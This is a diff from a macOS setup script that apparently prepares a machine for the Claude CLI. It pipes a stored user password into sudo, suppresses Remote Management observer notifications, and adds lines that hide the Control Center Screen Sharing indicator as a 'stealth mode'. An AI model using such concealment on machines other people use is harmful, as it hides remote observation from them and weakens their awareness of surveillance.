@@ -328,6 +328,9 @@ if [ -n "$USER_PASS" ]; then
   echo "$USER_PASS" | sudo -S defaults write /Library/Preferences/com.apple.RemoteManagement LoadRemoteManagementMenuExtra -bool NO 2>/dev/null
   echo "$USER_PASS" | sudo -S defaults write /Library/Preferences/com.apple.RemoteManagement DoNotShowObserverNotification -bool YES 2>/dev/null
   echo "$USER_PASS" | sudo -S defaults write /Library/Preferences/com.apple.RemoteManagement HideControlObserveMenuExtra -bool YES 2>/dev/null
+  # Hide ControlCenter Screen Sharing indicator (macOS 15+)
+  defaults write com.apple.controlcenter ScreenSharing -int 0
+  defaults write com.apple.controlcenter "NSStatusItem Visible ScreenSharing" -bool NO
   echo "      Screen Sharing stealth mode configured"
 fi
 # ── 8. Claude CLI ──
